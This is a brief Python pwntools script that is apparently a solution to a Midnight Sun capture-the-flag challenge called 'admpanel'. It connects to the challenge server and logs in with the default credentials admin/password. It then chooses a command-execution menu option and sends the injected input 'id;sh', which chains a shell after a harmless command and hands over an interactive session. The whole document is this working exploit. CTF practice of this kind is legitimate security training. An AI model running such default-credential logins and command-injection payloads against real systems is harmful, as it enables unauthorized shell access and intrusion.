from pwn import *

io = remote("admpanel-01.play.midnightsunctf.se",31337)


io.sendlineafter(" > ","1")
io.sendlineafter("  Input username: ","admin")
io.sendlineafter("  Input password: ","password")
io.sendlineafter(" > ","2")
io.sendlineafter("  Command to execute: ","id;sh")
io.interactive()
